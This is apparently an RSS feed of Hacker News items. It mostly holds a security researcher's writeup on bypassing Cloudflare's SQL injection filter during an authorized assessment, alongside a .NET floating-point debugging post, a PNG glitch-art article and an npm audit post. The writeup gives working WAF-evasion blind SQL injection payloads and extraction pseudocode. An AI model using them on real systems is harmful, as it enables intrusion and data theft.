<p>Incidentally, <code>MXCSR</code> (at least on Windows) is part of the thread context, which explains why the multi-threaded mode worked fine - it‚Äôs incredibly likely that the change also occurs in multi-threaded mode, but doesn‚Äôt affect other threads, including the one that does the bogus comparison, therefore effectively ‚Äúhiding‚Äù the issue.</p>

<p>That answers the immediate question of what‚Äôs going wrong, but now there‚Äôs a <em>huge</em> problem - anyone could be writing a value to a register at any time, so <em>who is</em>?</p>



<p>This is <em>about</em> the point where I started freaking out.
The obvious first step for a programmer during a freak-out is to start frantically googling around for <em>something</em> that can be related, and so I made my way over to <a href="https://github.com/dotnet/runtime"><code>dotnet/runtime</code></a> and started typing in vaguely related terms.</p>

<p>Surprise, it wasn‚Äôt an issue in the runtime itself, but I <em>did</em> find a few important clues:</p>

<ul>
  <li>
    <p>First, I <a href="https://github.com/dotnet/runtime/blob/96f178d32b7ba62485917ac46ef1edcfd3c2d10d/src/coreclr/src/vm/cgensys.h#L157-L171">found calls</a> to the <code>_mm_setcsr()</code> x64 intrinsic, which set the value of <code>MXCSR</code>:</p>

    <div><div><pre><code>  <span>ResetProcessorStateHolder</span> <span>()</span>
  <span>{</span>
<span>#if defined(TARGET_AMD64)
</span>      <span>m_mxcsr</span> <span>=</span> <span>_mm_getcsr</span><span>();</span>
      <span>_mm_setcsr</span><span>(</span><span>0x1f80</span><span>);</span>
<span>#endif // TARGET_AMD64
</span>  <span>}</span>

  <span>~</span><span>ResetProcessorStateHolder</span> <span>()</span>
  <span>{</span>
<span>#if defined(TARGET_AMD64)
</span>      <span>_mm_setcsr</span><span>(</span><span>m_mxcsr</span><span>);</span>
<span>#endif // TARGET_AMD64
</span>  <span>}</span>
</code></pre></div>    </div>

    <p>This clearly shows that the runtime is aware of what a <code>MXCSR</code> is and it <em>does</em> try to restore the sane value of <code>0x1F80</code>, <em>sometimes</em>.
I didn‚Äôt follow up on when, because I figured it was <em>very</em> unlikely Microsoft engineers would overlook something of this magnitude, and it was probably something that we were doing, directly or indirectly.</p>
  </li>
  <li>
    <p>Secondly, I spotted <a href="https://github.com/dotnet/runtime/blob/56797842d45a0f55345842ab166618d0c153ec3c/src/coreclr/src/jit/utils.cpp#L2086-L2087">this comment</a>:</p>

    <div><div><pre><code><span>// Return Value:</span>
<span>//    True if 'x' is a power of two value and is not denormal (denormals may not be well-defined</span>
<span>//    on some platforms such as if the user modified the floating-point environment via a P/Invoke)</span>
</code></pre></div>    </div>

    <p>This rang several alarm bells immediately.
As a cross-platform .NET Core game with a bespoke framework, lazer has to make a <em>lot</em> of P/Invokes and native calling to <em>be</em> a game.
Combined with the fact that denormals/flush to zero are usually set by programs that ‚Ä¶</p></li></ul></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bdach.github.io/debugging/2020/09/18/when-double-epsilon-can-equal-zero.html">https://bdach.github.io/debugging/2020/09/18/when-double-epsilon-can-equal-zero.html</a></em></p>]]>
            </description>
            <link>https://bdach.github.io/debugging/2020/09/18/when-double-epsilon-can-equal-zero.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24520728</guid>
            <pubDate>Fri, 18 Sep 2020 19:08:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I bypassed Cloudflare's SQL Injection filter]]>
            </title>
            <description>
<![CDATA[
Score 227 | Comments 98 (<a href="https://news.ycombinator.com/item?id=24520556">thread link</a>) | @gskourou
<br/>
September 18, 2020 | https://www.astrocamel.com/web/2020/09/04/how-i-bypassed-cloudflares-sql-injection-filter.html | <a href="https://web.archive.org/web/*/https://www.astrocamel.com/web/2020/09/04/how-i-bypassed-cloudflares-sql-injection-filter.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">

    <article>

        

<!--         <header class="post-header">
            <a id="blog-logo" href="">
                
                    <span class="blog-title">Astrocamel</span>
                
            </a>
        </header> -->

        <!-- <span class="post-meta">
            <time datetime="2020-09-04">04 Sep 2020</time>
            
                on Web
            
        </span> -->

        <!-- <h1 class="post-title">How I bypassed Cloudflare's SQL Injection filter</h1> -->

        <section>
            <p>In late 2018 I was tasked with performing a Web Application security assessment
for a large client.
After running the standard scans with automated tools, something interesting
came up: a possible SQL injection which couldn‚Äôt be exploited using the tool.
The reason: Cloudflare‚Äôs WAF and more specifically its SQL Injection filter.</p>

<h4 id="details-about-the-application">Details about the application</h4>
<p>The application was a generic website written in PHP with MySQL as the backend
DBMS. The vulnerable page submitted a POST request with multipart form body
data to the /index.php endpoint. I honestly don‚Äôt remember the use of the form
and it doesn‚Äôt really matter for the writeup. The POST request looked like this:</p>

<figure><pre><code data-lang="http"><span>POST</span> <span>/index.php</span> <span>HTTP</span><span>/</span><span>1.1</span>
<span>Host</span><span>:</span> <span>******</span>
<span>Connection</span><span>:</span> <span>close</span>
<span>Accept-Encoding</span><span>:</span> <span>gzip, deflate</span>
<span>Accept</span><span>:</span> <span>*/*</span>
<span>Content-Type</span><span>:</span> <span>multipart/form-data; boundary=dc30b7aab06d4aff91d4285d7e60d4f3</span>

--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="126"

###### ###### ########## ########
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="127"

###### ###### ########## ########
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="130"

...
...

###### #### 6 ########
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="task"

form.save
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="form_id"

X-MARK
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="96"

############
--dc30b7aab06d4aff91d4285d7e60d4f3

...
...

Content-Disposition: form-data; name="115[]"

########## ################## #### ###### ######
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="125"

###### ###### ########## ########
--dc30b7aab06d4aff91d4285d7e60d4f3--</code></pre></figure>

<p>The unsanitized parameter at X-MARK can be used to inject arbitrary values at
the place of the WHERE clause of an SQL SELECT query.
For example, if the above data was sent as the body of the POST request, the
SQL query which would be executed on the server would look something like this:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span> <span>WHERE</span> <span>X</span><span>-</span><span>MARK</span><span>;</span></code></pre></figure>

<p>The technique typically used for this kind of injection is a Time-based Blind
SQL injection. The problem was, that Cloudflare would recognize these kinds of
injections and block them on the spot. No matter how complicated I tried to make
the query or how many sqlmap tamper scripts I used, Cloudflare was always there.</p>

<p>To overcome this issue, I used an observation I made while manually testing for
SQL injections on the same request:
I had noticed that when I tried to inject code that resulted in something close
to the following SQL query:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span> <span>WHERE</span> <span>'a'</span><span>=</span><span>'a'</span><span>;</span></code></pre></figure>

<p>the web server responded with status 200 OK.
When I tried to inject code that resulted in something close to this SQL query:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span> <span>WHERE</span> <span>'a'</span><span>=</span><span>'b'</span><span>;</span></code></pre></figure>

<p>the server responded with status 500 Internal Server Error.</p>

<p>In other words when the SQL query in the backend did NOT return results, the web
server complained and crashed (probably because the backend code tried to access
an item in the returned list whose index was out of range).
This gave me an idea: writing a script that compared a character picked from the
name of the required DBMS entity and sequentially compared it with all
characters. The idea was, if the two characters matched, the server would return
a 200 OK status, else it would return a 500 Internal Server Error status and I
would have to compare the requested character with the next character in my
list.</p>

<h4 id="first-try">First Try</h4>
<p>My thinking was that if a wanted to find the first second character of the name
of the fifth table (as they are listed in information_schema.tables), I would
start by asking MySQL if that character is equal to ‚Äòa‚Äô and if not I would
continue with ‚Äòb‚Äô, ‚Äòc‚Äô etc. I would start by inject the following string (for
comparison with ‚Äòa‚Äô):</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>=</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>table_name</span><span>,</span> <span>2</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>tables</span>
  <span>LIMIT</span> <span>4</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>which would result in the following SQL query to be executed on the server:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span>
<span>WHERE</span> <span>'a'</span> <span>=</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>table_name</span><span>,</span> <span>2</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>tables</span>
  <span>LIMIT</span> <span>4</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>When I found the table name to be t1 for example, I was to brute force its
columns‚Äô names with the following starting injection:</p>

<p><em>INJECTION 1</em></p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>=</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>column_name</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>columns</span>
  <span>WHERE</span> <span>table_name</span> <span>=</span> <span>"t1"</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>and then actually get values out of column c1 of table t1 by starting with the
following injection:</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>=</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>c1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>t1</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>The idea was good, but Cloudflare would complain about the ‚Äò=‚Äô sign. The
injection</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>=</span> <span>'b'</span></code></pre></figure>

<p>would get blocked by Cloudflare‚Äôs WAF. After a bit of fiddling, I came up with
the following request that bypassed the ‚Äò=‚Äô restriction:</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>This means that the initial injection <em>INJECTION 1</em> would become:</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>LIKE</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>column_name</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>columns</span>
  <span>WHERE</span> <span>table_name</span> <span>=</span> <span>"t1"</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<h4 id="second-try">Second Try</h4>
<p><em>INJECTION 1</em> was still not ready to go. Cloudflare would still complain about stuff.
More specifically the injection</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>would still get blocked, not because of the LIKE keyword, but because of the ‚Äòa‚Äô
character. Comparing plain strings to anything was not allowed. To overcome this
issue I came up with the following injection that went through undetected by the
WAF:</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>The above injection sends the character ‚Äòa‚Äô as the hex-encoded value ‚Äò0x61‚Äô
which still allows it to work:</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span> <span>'a'</span></code></pre></figure>

<p>still returns True, and</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>passes through undetected and returns False.</p>

<p>The resulting <em>INJECTION 1</em> now looks like this:</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>column_name</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>columns</span>
  <span>WHERE</span> <span>table_name</span> <span>=</span> <span>"t1"</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<h4 id="third-try">Third Try</h4>
<p>The third obfuscation I had to enroll was a multi-line comment addition between
SQL query keywords. Cloudflare would block queries like this:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span> <span>WHERE</span> <span>'0x61'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>but with a multi-line comment trick, the new query would go through undetected:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span><span>/*trick comment*/</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span>
<span>FROM</span><span>/*trick comment*/</span> <span>t1</span>
<span>WHERE</span> <span>'0x61'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>Thus, applying this method on <em>INJECTION 1</em>, would make it look like this:</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span>
 <span>(</span><span>SELECT</span><span>/*trick comment*/</span> <span>SUBSTRING</span><span>(</span><span>column_name</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span><span>/*trick comment*/</span> <span>information_schema</span><span>.</span><span>columns</span>
  <span>WHERE</span> <span>table_name</span> <span>=</span> <span>"t1"</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>The above injection is in its final form and when passed as a form value to the
vulnerable web application the web server will reply with a 200 OK if the
character ‚Äòa‚Äô matches the first character of the first column‚Äôs name of table
t1.</p>

<h4 id="full-speed-ahead">Full Speed Ahead</h4>
<p>To make the retrieving of table contents from the application‚Äôs database easier
I wrote a script in Python to automate the process. The pseudocode of the script
goes something like this:</p>

<figure><pre><code data-lang="python"><span># assert names of columns and table name is known
</span><span>alphabet</span> <span>=</span> <span>[</span><span>a</span><span>,</span><span>b</span><span>,</span><span>c</span><span>,...,</span><span>y</span><span>,</span><span>z</span><span>]</span>
<span>characterPosition</span> <span>=</span> <span>1</span> <span># the position of the character we are bruteforcing
</span><span>for</span> <span>rowNumber</span> <span>in</span> <span>[</span><span>0</span><span>,</span><span>20</span><span>]:</span>
  <span>for</span> <span>columnName</span> <span>in</span> <span>columns</span><span>:</span>
    <span>for</span> <span>character</span> <span>in</span> <span>alphabet</span><span>:</span>
      <span>sqlInjection</span> <span>=</span> <span>'''
        0x{hex_encode(character)} LIKE (
        SELECT/*trick comment*/ SUBSTRING({columnName}, characterPosition,1)
        FROM/*trick comment*/ tableName
        LIMIT {rowNumber}, 1
        )
      '''</span>

      <span>inject</span> <span>sqlInjection</span> <span>is</span> <span>POST</span> <span>request</span> <span>body</span>
      <span>if</span> <span>response</span><span>.</span><span>status</span> <span>==</span> <span>200</span><span>:</span>
        <span>result</span> <span>+=</span> <span>character</span>
        <span>recurse</span> <span>function</span> <span>with</span> <span>characterPosition</span><span>++</span>
      <span>elif</span> <span>response</span><span>.</span><span>status</span> <span>==</span> <span>500</span><span>:</span>
        <span>continue</span> <span>with</span> <span>next</span> <span>character</span> <span>in</span> <span>alphabet</span>

      <span>return</span> <span>result</span></code></pre></figure>

<p>And this is how I bypassed Cloudflare WAF‚Äôs SQL injection protection. I got a
free t-shirt and a place in <a href="https://hackerone.com/gskourou">Cloudflare‚Äôs HoF</a>.</p>

<h4 id="mitigation">Mitigation</h4>
<p>Cloudlfare reviewed and fixed the vulnerability a few days after my report.</p>
<p>The safest way to mitigate SQL injections on your databases is prepared
statements. These come in most database interaction libraries for most
languages. You can find a full list of ways to mitigate SQL injections at
<a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">OWASP</a>.
It is my opinion that if developers take good care to apply security measures
on their applications, WAFs are most of the times unnecessary. All you need to
do is sanitize the users‚Äô input properly.</p>


        </section>

        

        

    </article>

</div></div>]]>
            </description>
            <link>https://www.astrocamel.com/web/2020/09/04/how-i-bypassed-cloudflares-sql-injection-filter.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24520556</guid>
            <pubDate>Fri, 18 Sep 2020 18:52:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Art of PNG Glitch]]>
            </title>
            <description>
<![CDATA[
Score 48 | Comments 9 (<a href="https://news.ycombinator.com/item?id=24520201">thread link</a>) | @pmoriarty
<br/>
September 18, 2020 | https://ucnv.github.io/pnglitch/ | <a href="https://web.archive.org/web/*/https://ucnv.github.io/pnglitch/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <header>
      <a title="PNGlitch" href="https://github.com/ucnv/pnglitch/"><img src="https://ucnv.github.io/pnglitch/files/forkme.png" alt="PNGlitch"></a>
      
    </header>
    <section>
      <h2>Overview</h2>
      <p>
      PNG is an image format that has a history of development beginning in 1995, and it is still a popular, long living format. Generally, it is known for its features such as lossless compression and  the ability to handle transparent pixels. <br>
      However, we do not look at image formats from a general point of view, but rather think of ways to glitch them. When we look at PNG from the point of view of glitch, what kind of peculiarity does it have?
      </p>
      <h3>Checksum</h3>
      <p>
      We should first look into the checksum system of the CRC32 algorithm. It is used to confirm corrupted images, and when it detects corruption in an image file, normal viewer applications refuse to display it. Therefore, it is impossible to generate glitches using simple methods such as rewriting part of the binary data using text editors or binary editors (you will completely fail). In other words, the PNG format is difficult to glitch. <br>
      We need to create glitches accordingly to the PNG specification in order to avoid this failure. This means that we must rewrite the data after decoding CRC32, re-calculate it and attach it to the edited data.
      </p>

      <h3>State</h3>
      <p>
      Next we want to look at the transcode process of PNG. The chart shown below is a simplified explanation of how PNG encoding flows.
      </p>
      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/states.png" alt="Figure 1)  PNG encoding flow">
        <figcaption>Figure 1) PNG encoding flow</figcaption>
      </figure>


      <p>
      Each of the four states that are shown above can be glitch targets. However, glitching the the first ‚ÄúRaw Data‚Äù is the same as glitching BMP, so it technically isn‚Äôt a PNG glitch (at the end, it is the same as PNG with the None filter applied. I will explain this in the next section). The final ‚ÄúFormatted PNG‚Äù glitch will not work because of the checksum system I mentioned above.<br>
      This means that PNG glitches can be made when the ‚ÄúFiltered Data‚Äù or ‚ÄúCompressed Data‚Äù is manipulated. I will explain about filters in the following subsection. When ‚ÄúFiltered Data‚Äù is glitched, it shows a distinctive effect; patterns that look like flower petals scatter around the image. The difference between the filters become clear when the ‚ÄúFiltered Data‚Äù is glitched. On the other hand, ‚ÄúCompressed Data‚Äù glitches are flavored by their own compression algorithm, which is Deflate compression. It shows an effect similar to a snow noise image.
      </p>
      <p>
      There are elements else besides the transcoding process that could also influence the appearance of glitches such as transparent pixels and interlaces.
      </p>
      <h3>Five filters</h3>
      <p>
      The factor that characterizes the appearance of glitches the most is the process called filter. The filter converts the uncompressed pixel data of each scanline using a certain algorithm in order to improve the compression efficiency. There are five types of filters that include four algorithms called Sub, Up, Average and Paeth, and also None (which means no filter applied). PNG images are usually compressed after the most suitable filter is applied to each scanline, and therefore all five filters are combined when PNG images are made.<br>
      These five filters usually only contribute to the compression efficiency, so the output result is always the same no matter which filter is applied. However, a clear difference appears in the output result when the filtered data is damaged. It is difficult to recognize the difference of the filters when an image is optimized and has all five filters combined, but the difference becomes obvious when an image is glitched when the same, single filter is applied to each scanline.<br>
      I will show the difference of the effect that each filter has later on, but when we look close into the results, we will understand which filter is causing which part of the beauty of PNG glitches (yes, they are beautiful) to occur.
      </p>
      <p>
        I will show the actual glitch results in the next section.
      </p>

      <h2>Glitching: In practice</h2>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png.png" alt="Figure 2) Original PNG image"></a>
        <figcaption>Figure 2) Original PNG image</figcaption>
      </figure>
      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-optimized.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-optimized.png" alt="Figure 3) Glitched PNG image"></a>
        <figcaption>Figure 3) Glitched PNG image</figcaption>
      </figure>
      <p>
      I have shown two PNG images above: one is an image before it has been glitched, and one is an image that has been glitched.<br>
      This is a Filtered Data glitch, which I explained in the previous section.<br>
      The original PNG has optimized filters applied to each scanline, and all of the five filters have been combined. The glitch reveals how the five filters were balanced when they were the combined.
      </p>
      <h3>Difference between filters</h3>
      <p>
      Lets look into the difference between each filter type.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-none.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-none.png" alt="Figure 4) Glitched PNG, filtered with None"></a>
        <figcaption>Figure 4) Glitched PNG, filtered with None</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-none-detail.png" alt="Figure 5) Magnified view of fig. 4">
        <figcaption>Figure 5) Magnified view of fig. 4</figcaption>
      </figure>
      <p>
      The image above has applied ‚ÄúNone (no filter)‚Äù, meaning that it is a raw data glitch. Each pixel stands alone in this state and do not have any relationship with the others, so a single re-wrote byte does not have a wide range influence.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-sub.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-sub.png" alt="Figure 6) Glitched PNG, filtered with Sub"></a>
        <figcaption>Figure 6) Glitched PNG, filtered with Sub</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-sub-detail.png" alt="Figure 7) Magnified view of fig. 6">
        <figcaption>Figure 7) Magnified view of fig. 6</figcaption>
      </figure>
      <p>
      This is a glitched image that has the filter ‚ÄúSub‚Äù applied to each scanline. When the Sub algorythm is applied, the target pixel rewrites itself by refering to the pixel that is right next to it. This is why the glitch pattern avalanches towards the right side.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-up.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-up.png" alt="Figure 8) Glitched PNG, filtered with Up"></a>
        <figcaption>Figure 8) Glitched PNG, filtered with Up</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-up-detail.png" alt="Figure 9) Magnified view of fig. 8">
        <figcaption>Figure 9) Magnified view of fig. 8</figcaption>
      </figure>
      <p>
      This is the filter ‚ÄúUp‚Äù. This filter is similar to Sub, but its reference direction is the top and bottom.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-average.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-average.png" alt="Figure 10) Glitched PNG, filtered with Average"></a>
        <figcaption>Figure 10) Glitched PNG, filtered with Average</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-average-detail.png" alt="Figure 11) Magnified view of fig. 10">
        <figcaption>Figure 11) Magnified view of fig. 10</figcaption>
      </figure>
      <p>
      The filter ‚ÄúAverage‚Äù refers to a diagonal direction. It shows a meteor like tail that starts from the damaged pixel. The soft gradation effect is also one of the peculiarities of this filter. The result of a PNG glitch when the Average filter is applied is a glitch that lacks glitchiness, and is also the most delicate portion of PNG glitching.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-paeth.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-paeth.png" alt="Figure 12) Glitched PNG, filtered with Paeth"></a>
        <figcaption>Figure 12) Glitched PNG, filtered with Paeth</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-paeth-detail.png" alt="Figure 13) Magnified view of fig. 12">
        <figcaption>Figure 13) Magnified view of fig. 12</figcaption>
      </figure>
      <p>
      The filter ‚ÄúPaeth‚Äù has the most complicated algorithm when compared with the others. It also has the most complicated glitch effect. The glitch will affect a wide range of areas even with the least byte re-writing. The keynote effect of PNG glitch is caused by this filter; the figure shown in the original image is maintained, but is intensely destroyed at the same time.
      </p>

      <h3>Glitch after compression</h3>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-compressed.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-compressed.png" alt="Figure 14) Glitched PNG, after compressed"></a>
        <figcaption>Figure 14) Glitched PNG, after compressed</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-compressed-detail.png" alt="Figure 15) Magnified view of fig. 14">
        <figcaption>Figure 15) Magnified view of fig. 14</figcaption>
      </figure>
      <p>
      This is a glitch of the state that I referred to as Compressed Data in the previous section. A snowstorm effect appears, and it is difficult to recognize the original figure in the image. It infrequently remains to show effects of the filters. The image is often completely destroyed.
      </p>
„ÄÄ
      <h3>Transparence</h3>
      <p>
      Lets look into what happens when an image that includes transparent pixels is glitched.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-alpha.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-alpha.png" alt="Figure 16) Original PNG image"></a>
        <figcaption>Figure 16) Original PNG image with alpha pixels</figcaption>
      </figure>
      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-alpha.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-alpha.png" alt="Figure 17) Glitched PNG, with alpha pixels"></a>
        <figcaption>Figure 17) Glitched PNG, with alpha pixels</figcaption>
      </figure>
      <p>
      The transparency comes as an effect. Especially the filter ‚ÄúAverage‚Äù seems to blend transparent pixels gradually.
      A 100% gathering of transparent pixels is handled in the same way as a solid colored section. You can tell that the filter ‚ÄúUp‚Äù is often applied to solid colored sections.<br>
      (There is a possibility that newer general-purpose image formats switch their compression scheme of each part depending on if the image is a solid colored section, or else a complicated image such as photographs. The use of images that include solid colored sections for testing glitches is an effective method. One example is a WebP. )
      </p>

      <h3>Interlace</h3>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-interlace.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-interlace.png" alt="Figure 18) Glitched PNG, with interlace"></a>
        <figcaption>Figure 18) Glitched PNG, with interlace</figcaption>
      </figure>
      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-interlace-detail.png" alt="Figure 19) Magnified view of fig. 18">
        <figcaption>Figure 19) Magnified view of fig. 18</figcaption>
      </figure>
      <p>
        PNG interlaces are divided into seven passes, using the Adam7 algorithm based on 8x8 pixels. We are able to visualy observe that algorithm when an interlaced PNG is glitched. We can also confirm a stitched effect, and that its angle has become narrow towards the Average filter (see appendix B).
      </p>

      <h2>Conclusion</h2>
      <p>
      PNG is a very simple format compared to JPEG or other new image formats. The filter algorithms are like toys, and its compression method is the same as oldschool Zip compression. However, this simple image format shows a surprisingly wide range of glitch variations. We would perhaps only need one example to explain a JPEG glitch, but we need many different types of samples in order to explain what a PNG glitch is.<br>
      PNG was developed as an alternative format of GIF. However, when it comes to glitching, GIF is a format that is too poor to be compared with PNG. PNG has prepared surprisingly rich results that have been concealed by the checksum barrier for a long time.
      </p>


      <hr>
    </section>
    <section>

      <h2><a name="appendix-a"></a>Appendix A: PNGlitch library</h2>
      <p>
      The author released <a href="http://www.jarchive.org/akami/aka018.html">a tiny script for PNG glitch</a> in 2010. Back then, it only removed the CRC32 and added it back again after the internal data was glitched.<br>
      Since then, the author has continued to rewrite the script and make improved versions of it for the purpose of using it in his own work, but he decided to make a library that adopts his know-how in 2014. The Ruby library <a href="https://github.com/ucnv/pnglitch">PNGlitch</a> came out as the result.<br>
      Every glitch image that appears in this article is made by using this ‚Ä¶</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ucnv.github.io/pnglitch/">https://ucnv.github.io/pnglitch/</a></em></p>]]>
            </description>
            <link>https://ucnv.github.io/pnglitch/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24520201</guid>
            <pubDate>Fri, 18 Sep 2020 18:26:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[NPM Audit and Jenkins Warnings Next Generation (Custom Groovy Parser)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24520186">thread link</a>) | @fazlerocks
<br/>
September 18, 2020 | https://uko.codes/npm-audit-jenkins-warnings-next-generation-custom-groovy-parser | <a href="https://web.archive.org/web/*/https://uko.codes/npm-audit-jenkins-warnings-next-generation-custom-groovy-parser">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>At work, I'm developing some projects that use NPM as a package manager. Starting from version 6, NPM will display short audit information at the end of an <code>npm install</code> execution in the following format:</p>
<pre><code><span>found</span> <span>290</span> vulnerabilities (<span>283</span> low, <span>5</span> moderate, <span>2</span> high)
</code></pre><p>You can also get more detailed information. If you run <code>npm audit</code> you will receive explanations for each vulnerability and also some suggestions about how to fix that. For example:</p>
<pre><code># Run  npm <span>update</span> bl 
